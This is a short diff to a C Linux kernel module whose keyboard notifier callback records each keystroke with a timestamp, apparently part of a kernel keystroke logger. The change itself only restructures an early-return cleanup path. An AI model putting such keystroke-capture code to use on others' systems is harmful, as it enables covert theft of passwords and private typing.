@@ -98,8 +98,10 @@ static int	keyboard_event(struct notifier_block *nb, unsigned long action, void 
 	if (param->value > MAX_KEYS_SUPPORTED)
 		return NOTIFY_OK;
 	stroke = kmalloc(sizeof(struct s_keystroke), GFP_ATOMIC);
-	if (!stroke || action != KBD_KEYCODE)
-		return kfree(stroke), NOTIFY_OK;
+	if (!stroke || action != KBD_KEYCODE) {
+		kfree(stroke);
+		return NOTIFY_OK;
+	}
 	memcpy(&(stroke->key), &(keys_table[param->value]), sizeof(struct s_key));
 	ktime_get_real_ts64(&ts);
 	time64_to_tm(ts.tv_sec, 0, &(stroke->tm));
